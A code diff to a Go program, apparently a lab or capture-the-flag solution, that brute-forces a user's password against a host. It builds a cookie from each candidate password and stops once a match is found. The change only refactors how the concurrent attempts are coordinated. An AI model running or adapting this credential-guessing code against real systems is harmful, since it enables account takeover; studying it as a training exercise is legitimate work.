@@ -41,23 +41,24 @@ func solve(hostname string) {
 
 func bruteForce(hostname string, targetUser string, candidatePasswords []string) {
 	found := make(chan bool)
-	done := make(chan bool)
 	maxRoutines := 15 // Limits the number of routines to not overflow the number of sockets that can be open
 
 	routinesCalled := 0
 	for _, password := range candidatePasswords {
-		go passwordAttempt(hostname, targetUser, password, found, done)
+		go passwordAttempt(hostname, targetUser, password, found)
 		routinesCalled++
 
 		if routinesCalled == maxRoutines {
-			for routinesCalled > 0 {
-				<-done
+			foundPassword := false
+			for routinesCalled > 0 && !foundPassword {
+				foundPassword = <-found
 				routinesCalled--
+			}
+			if foundPassword {
+				break
 			}
 		}
 	}
-
-	<-found
 }
 
 func passwordAttempt(
@@ -65,7 +66,6 @@ func passwordAttempt(
 	targetUser string,
 	candidatePassword string,
 	found chan bool,
-	done chan bool,
 ) {
 	cookieValue := createCookieValue(targetUser, candidatePassword)
 	log.Printf("Cookie value: %s", cookieValue)
@@ -76,10 +76,9 @@ func passwordAttempt(
 
 	if foundPassword {
 		log.Printf("Found password! It is: %s", candidatePassword)
-		found <- true
 	}
 
-	done <- true
+	found <- foundPassword
 }
 
 func readFromFile(filePath string) ([]string, error) {
